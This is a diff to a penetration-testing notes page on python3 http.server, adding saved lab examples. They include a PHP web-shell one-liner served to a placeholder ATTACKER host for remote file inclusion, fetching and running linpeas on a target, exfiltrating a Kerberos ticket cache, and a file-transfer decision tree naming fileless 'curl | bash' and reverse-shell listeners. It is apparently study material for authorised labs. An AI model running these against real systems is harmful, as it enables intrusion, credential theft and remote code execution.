@@ -9,6 +9,128 @@ hideFooterPagination: true
 
 {/* Generated from Commands/http-server.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## python3 http.server: choose the operation and read the result
+
+Serve the current directory over HTTP.
+
+### What the result establishes
+
+The server log proves an HTTP request reached this listener; confirm the returned file separately.
+
+### Prerequisites and common failures
+
+The current directory is what gets served. Binding an interface and choosing a reachable callback address are distinct decisions.
+
+### Example 1: Commands
+
+Run in: **Kali**. Run from the folder containing the files to share.
+
+```bash
+python3 -m http.server 8000
+```
+
+### Example 2: Quick Web Servers (Serve Files from Target)
+
+Run in: **Saved lab example**.
+
+```bash
+python3 -m http.server                    # port 8000 default
+python2.7 -m SimpleHTTPServer             # Python 2 version
+php -S 0.0.0.0:8000                       # PHP built-in server
+ruby -run -ehttpd . -p8000                # Ruby built-in server
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Web Servers (Serve Files from Target)](/post-exploitation/file-transfers-cheat-sheet#quick-web-servers-serve-files-from-target). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Quick Decision Tree
+
+Run in: **Saved lab example**.
+
+```text
+DOWNLOADING TO WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
+├── Only cmd.exe?       → certutil or bitsadmin
+├── Internal network?   → SMB (impacket-smbserver)
+├── Need fileless?      → IEX + DownloadString
+└── Nothing works?      → Base64 encode/decode via clipboard
+
+DOWNLOADING TO LINUX:
+├── Have curl/wget?     → Use them (simplest)
+├── Need fileless?      → curl | bash  or  wget -qO- | python3
+├── Have Python/PHP?    → Use language one-liners
+├── Nothing available?  → /dev/tcp bash trick
+└── Need encryption?    → OpenSSL s_server/s_client
+
+UPLOADING FROM WINDOWS:
+├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
+├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
+├── Internal network?   → SMB or WebDAV
+└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
+
+UPLOADING FROM LINUX:
+├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
+├── Have SCP?           → scp file user@attacker:/path/
+├── Have Python?        → python3 requests.post one-liner
+└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
+```
+
+Saved context: [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service
+
+Run in: **Saved lab example**.
+
+```text
+Server: Core FTP HTTP Server
+Content-type: application/octet-stream
+```
+
+Saved context: [Common Services: Personal Assessment Notes — Phase 1 — Confirming Arbitrary File Write via CoreFTP's HTTP(S) Service](/modules/common-services/assessment#phase-1-—-confirming-arbitrary-file-write-via-coreftps-https-service). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Enumeration (post-foothold)
+
+Run in: **Saved lab example**.
+
+```bash
+# Attacker
+python3 -m http.server 8080
+
+# Target
+wget http://10.10.14.174:8080/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Saved context: [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Step 5 — Transfer the ticket from LINUX01 to Kali
+
+Run in: **Saved lab example**.
+
+```bash
+# [ON LINUX01, as root] copy to a clean dir and serve it
+mkdir /tmp/x && cp /tmp/krb5cc_647401106_8Dt6uj /tmp/x/ && cd /tmp/x
+python3 -m http.server 8080
+```
+
+Saved context: [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: LFI → RCE
+
+Run in: **Saved lab example**.
+
+```bash
+# RFI (allow_url_include=On): host a payload and include it
+echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
+http://$IP/?page=http://ATTACKER/sh.php&0=id
+```
+
+Saved context: [LFI / RFI — LFI → RCE](/web/lfi-rfi#lfi-→-rce). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Serve the current directory over HTTP.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=http-server) · [All tools](/index)
@@ -42,6 +164,13 @@ Run from the folder containing the files to share.
 echo '<?php system($_GET[0]); ?>' > sh.php ; python3 -m http.server 80
 http://$IP/?page=http://ATTACKER/sh.php&0=id
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [LFI / RFI — LFI → RCE](/web/lfi-rfi#lfi-→-rce)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -79,6 +208,13 @@ UPLOADING FROM LINUX:
 └── Nothing works?      → Start python3 -m http.server on target, wget from attacker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Citrix NetScaler: CVE-2019-19781 Reference — Example 6: Quick Decision Tree](/enumeration/citrix-netscaler#example-6-quick-decision-tree) · [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Quick Web Servers (Serve Files from Target)">
@@ -93,6 +229,13 @@ python2.7 -m SimpleHTTPServer             # Python 2 version
 php -S 0.0.0.0:8000                       # PHP built-in server
 ruby -run -ehttpd . -p8000                # Ruby built-in server
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — Quick Web Servers (Serve Files from Target)](/post-exploitation/file-transfers-cheat-sheet#quick-web-servers-serve-files-from-target)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -111,6 +254,13 @@ wget http://10.10.14.174:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Enumeration (post-foothold)](/cheatsheets/nibbles#enumeration-post-foothold)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -133,6 +283,13 @@ nc -lvnp 4444       # netcat listener (catch reverse shells)
 python3 -m http.server 80            # quick web server to transfer files
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kali Terminal, tmux, zsh, and Vim — 6. Networking / pentest quick commands](/cheatsheets/terminal-tmux-zsh-cheatsheet#6-networking-/-pentest-quick-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
@@ -147,6 +304,13 @@ mkdir /tmp/x && cp /tmp/krb5cc_647401106_8Dt6uj /tmp/x/ && cd /tmp/x
 python3 -m http.server 8080
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pass the Ticket from Linux**
 
 Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>  and the  wget `http://...:<port>`  must use the  same  port.
@@ -154,6 +318,13 @@ Context from the notebook: Port mismatch:  the  python3 -m http.server &lt;port>
 ```text
 python3 -m http.server <port>
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 5 — Transfer the ticket from LINUX01 to Kali](/password-attacks/pass-the-ticket-from-linux#step-5-—-transfer-the-ticket-from-linux01-to-kali)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -191,6 +362,13 @@ python3 -m http.server <port>
 └── Either → reverse shell via exploit
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The essential toolset">
@@ -204,6 +382,13 @@ Context from the notebook: Catch shells / transfer nc ,  python3 -m http.server 
 ```text
 python3 -m http.server
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Getting Started with Penetration Testing — The essential toolset](/getting-started/getting-started-cheat-sheet#the-essential-toolset) · [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference) · [File Transfers for Linux and Windows — Why this matters & how to choose a method](/post-exploitation/file-transfers-cheat-sheet#why-this-matters-&-how-to-choose-a-method)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -219,6 +404,21 @@ Context from the notebook: Post-exploitation enumeration with  sudo -l  (cross-c
 python3 -m http.server 8080
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [HTB Nibbles: Walkthrough and Report — Technical walkthrough](/cheatsheets/nibbles#technical-walkthrough)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+
+{/* VAULT_RELATED_END */}
